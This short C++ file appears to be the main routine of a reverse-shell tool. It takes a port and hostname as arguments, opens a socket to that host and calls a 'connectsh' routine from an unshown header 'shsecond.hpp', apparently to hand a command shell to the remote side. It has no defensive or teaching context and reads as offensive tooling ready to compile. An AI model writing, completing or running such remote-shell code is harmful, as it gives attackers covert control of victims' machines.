#include "shsecond.hpp"

int main(int argc, char* argv[]){
    try{
        unsigned int PORT = atoi(argv[1]);
        std::string hostname = std::string(argv[2]);

        secondsh ashell;
        int* sock = ashell.connect_socket(PORT, hostname);
        ashell.connectsh();
    }

    catch(...){std::cout << "[-] error" << std::endl;}

    return 0;
}